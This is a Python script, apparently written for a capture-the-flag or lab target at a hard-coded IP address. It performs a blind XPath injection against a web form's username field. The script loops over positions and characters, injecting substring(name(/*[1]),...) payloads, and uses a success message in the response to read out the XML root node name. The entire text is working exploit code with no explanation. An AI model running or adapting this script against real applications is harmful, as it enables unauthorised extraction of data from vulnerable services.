import requests

url = "http://83.136.253.251:43217//index.php"
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://83.136.250.104:57578",
    "DNT": "1",
    "Sec-GPC": "1",
    "Connection": "close",
    "Referer": "http://83.136.250.104:57578/index.php",
    "Upgrade-Insecure-Requests": "1"
}

# Length of the root node name
root_node_length = 8

# Initialize the root node name
root_node_name = ''

# Iterate through each character in the root node name
for position in range(1, root_node_length + 1):
    # Iterate through alphanumeric characters
    for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
        username_payload = f"invalid' or substring(name(/*[1]),{position},1)='{char}' and '1'='1"
        data = {"username": username_payload, "msg": ''}

        response = requests.post(url, headers=headers, data=data)

        # Check if the response contains the success message
        if '<script>alert("Message successfully sent!");</script>' in response.text:
            root_node_name += char
            print(f"Character at position {position}: {char}")
            break

print(f"Found root node name: {root_node_name}")

##
##
